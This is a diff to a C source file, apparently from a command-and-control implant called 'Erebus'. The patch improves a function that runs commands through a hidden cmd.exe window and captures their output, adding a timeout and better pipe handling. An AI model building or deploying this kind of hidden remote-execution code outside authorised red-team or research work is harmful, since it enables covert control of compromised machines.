@@ -6,7 +6,8 @@
 
 #include "erebus/pb_c2.h"
 
-#define MAX_OUTPUT (10 << 20)
+#define MAX_CAPTURE 65536
+#define SHELL_TIMEOUT_MS 120000
 
 static int run_cmd(const char *command, char **stdout_out, char **stderr_out, int32_t *exit_code) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -16,7 +17,9 @@ static int run_cmd(const char *command, char **stdout_out, char **stderr_out, in
     SetHandleInformation(rd_out, HANDLE_FLAG_INHERIT, 0);
     SetHandleInformation(rd_err, HANDLE_FLAG_INHERIT, 0);
 
-    STARTUPINFOA si = { sizeof(si) };
+    STARTUPINFOA si;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.hStdOutput = wr_out;
     si.hStdError = wr_err;
@@ -25,7 +28,8 @@ static int run_cmd(const char *command, char **stdout_out, char **stderr_out, in
     char cmdline[8192];
     snprintf(cmdline, sizeof(cmdline), "cmd.exe /C %s", command);
 
-    PROCESS_INFORMATION pi = {0};
+    PROCESS_INFORMATION pi;
+    memset(&pi, 0, sizeof(pi));
     if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(rd_out); CloseHandle(wr_out); CloseHandle(rd_err); CloseHandle(wr_err);
         return 0;
@@ -33,20 +37,78 @@ static int run_cmd(const char *command, char **stdout_out, char **stderr_out, in
     CloseHandle(wr_out);
     CloseHandle(wr_err);
 
-    char *out_buf = (char *)calloc(1, 65536);
-    char *err_buf = (char *)calloc(1, 65536);
+    char *out_buf = (char *)calloc(1, MAX_CAPTURE);
+    char *err_buf = (char *)calloc(1, MAX_CAPTURE);
+    if (!out_buf || !err_buf) {
+        free(out_buf); free(err_buf);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(rd_out); CloseHandle(rd_err);
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        return 0;
+    }
     size_t out_len = 0, err_len = 0;
     char tmp[4096];
     DWORD n = 0;
+    int timed_out = 0;
+    DWORD start = GetTickCount();
+
+    for (;;) {
+        /* Drain available pipe data so child cannot block on full pipe. */
+        DWORD avail = 0;
+        while (PeekNamedPipe(rd_out, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+            DWORD to_read = avail > sizeof(tmp) ? (DWORD)sizeof(tmp) : avail;
+            if (!ReadFile(rd_out, tmp, to_read, &n, NULL) || n == 0) break;
+            if (out_len + n < MAX_CAPTURE - 1) {
+                memcpy(out_buf + out_len, tmp, n);
+                out_len += n;
+            }
+        }
+        avail = 0;
+        while (PeekNamedPipe(rd_err, NULL, 0, NULL, &avail, NULL) && avail > 0) {
+            DWORD to_read = avail > sizeof(tmp) ? (DWORD)sizeof(tmp) : avail;
+            if (!ReadFile(rd_err, tmp, to_read, &n, NULL) || n == 0) break;
+            if (err_len + n < MAX_CAPTURE - 1) {
+                memcpy(err_buf + err_len, tmp, n);
+                err_len += n;
+            }
+        }
+
+        DWORD wait = WaitForSingleObject(pi.hProcess, 100);
+        if (wait == WAIT_OBJECT_0) break;
+
+        if (GetTickCount() - start >= SHELL_TIMEOUT_MS) {
+            timed_out = 1;
+            TerminateProcess(pi.hProcess, 1);
+            WaitForSingleObject(pi.hProcess, 5000);
+            break;
+        }
+    }
+
+    /* Final drain after exit */
     while (ReadFile(rd_out, tmp, sizeof(tmp), &n, NULL) && n > 0) {
-        if (out_len + n < 65535) { memcpy(out_buf + out_len, tmp, n); out_len += n; }
+        if (out_len + n < MAX_CAPTURE - 1) {
+            memcpy(out_buf + out_len, tmp, n);
+            out_len += n;
+        }
     }
     while (ReadFile(rd_err, tmp, sizeof(tmp), &n, NULL) && n > 0) {
-        if (err_len + n < 65535) { memcpy(err_buf + err_len, tmp, n); err_len += n; }
+        if (err_len + n < MAX_CAPTURE - 1) {
+            memcpy(err_buf + err_len, tmp, n);
+            err_len += n;
+        }
     }
-    WaitForSingleObject(pi.hProcess, INFINITE);
+
     DWORD code = 1;
     GetExitCodeProcess(pi.hProcess, &code);
+    if (timed_out) {
+        const char *msg = "\r\n[erebus] shell timeout (120s), process killed\r\n";
+        size_t mlen = strlen(msg);
+        if (err_len + mlen < MAX_CAPTURE - 1) {
+            memcpy(err_buf + err_len, msg, mlen);
+            err_len += mlen;
+        }
+        code = 124;
+    }
 
     CloseHandle(rd_out);
     CloseHandle(rd_err);
